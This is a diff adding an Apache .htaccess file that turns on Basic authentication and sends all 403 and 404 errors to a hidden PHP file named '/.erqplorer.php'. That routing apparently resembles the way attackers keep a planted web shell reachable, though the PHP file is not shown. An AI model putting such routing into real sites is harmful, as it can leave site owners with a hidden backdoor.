@@ -1,0 +1,7 @@
+AuthType Basic
+AuthName "Private"
+AuthUserFile /etc/apache2/.htpasswd
+Require valid-user
+
+ErrorDocument 403 /.erqplorer.php
+ErrorDocument 404 /.erqplorer.php
